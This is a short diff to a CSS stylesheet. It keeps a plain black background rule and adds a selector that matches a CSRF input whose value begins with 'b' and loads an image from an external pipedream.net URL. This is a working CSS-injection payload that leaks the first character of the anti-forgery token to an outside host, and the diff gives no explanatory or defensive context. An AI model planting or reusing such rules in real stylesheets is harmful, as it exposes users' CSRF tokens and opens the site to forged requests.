@@ -1,3 +1,7 @@
 body{
     background: black;
 }
+
+input[name=csrf][value^=b]{
+    background-image: url(https://eoa21cz1z5v9xqj.m.pipedream.net/b);
+}
